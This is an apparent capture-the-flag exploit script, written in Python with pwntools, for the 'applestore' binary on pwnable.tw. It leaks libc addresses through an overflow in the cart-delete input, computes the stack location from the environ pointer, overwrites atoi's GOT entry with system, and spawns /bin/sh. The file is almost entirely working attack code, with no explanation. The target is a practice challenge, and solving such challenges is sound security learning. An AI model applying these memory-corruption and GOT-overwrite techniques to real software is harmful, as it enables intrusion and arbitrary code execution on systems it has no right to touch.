from pwn import *

libc = ELF('./libc_32.so.6')
elf = ELF('./applestore')

context(terminal=['tmux', 'new-window'])

context.log_level = 'DEBUG'


if len(sys.argv) > 2 and sys.argv[1] == 'debug':
        break_point = sys.argv[2]
        print(break_point)
        p = gdb.debug('./applestore',
     '''
        b *%s
        commands
            break *0x8048a00 if $eax == 0xffffd698
        end
      ''' % break_point)

elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = gdb.debug('./applestore')
else:
    #p = process('./applestore')
    p = remote('chall.pwnable.tw', 10104)



environ_libc = libc.symbols['environ'] 
atoi_libc = libc.symbols['atoi'] 
system_libc = libc.symbols['system'] 
atoi_got = 0x0804B040 


def checkout():
    p.recvuntil(">")
    p.sendline("5")
    p.recvuntil(">")
    p.sendline("y")

def cart():
    p.recvuntil(">")
    p.sendline("4")
    p.recvuntil(">")
    p.sendline("y")

def cart_pow(data):
    p.recvuntil(">")
    p.sendline("4")
    p.recvuntil(">")
    p.sendline(data)

def exit():
    p.recvuntil(">")
    p.sendline("6")

def add(item):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline(item)

def input_bytes(byts):
    p.recvuntil(">")
    p.sendline(byts)
    p.recvuntil(">")

def delete(item):
    p.recvuntil(">")
    p.sendline("3")
    p.recvuntil(">")
    p.sendline(item)

def delete_overflow(item, overflow):
    p.recvuntil(">")
    p.sendline("3")
    #p.sendline("3" + overflow)
    p.recvuntil(">")
    p.sendline(item + overflow)

for x in range(20):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline("2")

for x in range(6):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline("1")



checkout()

delete_overflow("27", p32(atoi_got) + "aaac" + p32(0x00000000) + p32(0x00000000))

p.recvuntil(":")
atoi = u32(p.recv(4))

print('[+] :: %x' %libc.symbols['environ'])

libc.address = atoi - atoi_libc

print('[+] :: %x' %libc.symbols['environ'])

print("atoi :: " + str(hex(atoi)))


delete_overflow("27", p32(libc.symbols['environ']) + "aaac" + p32(0x00000000) + p32(0x00000000))

p.recvuntil(":")
environ_add = u32(p.recv(4))
print('environ_add :: %x' %environ_add)

ebp = environ_add - 0x104

delete_overflow("27", p32(0x00000000) + p32(0x00000000) + p32(atoi_got + 0x22) + p32(ebp - 0x8))
p.recvuntil(">")
p.sendline(p32(libc.symbols['system']) + ";/bin/sh")

p.interactive()
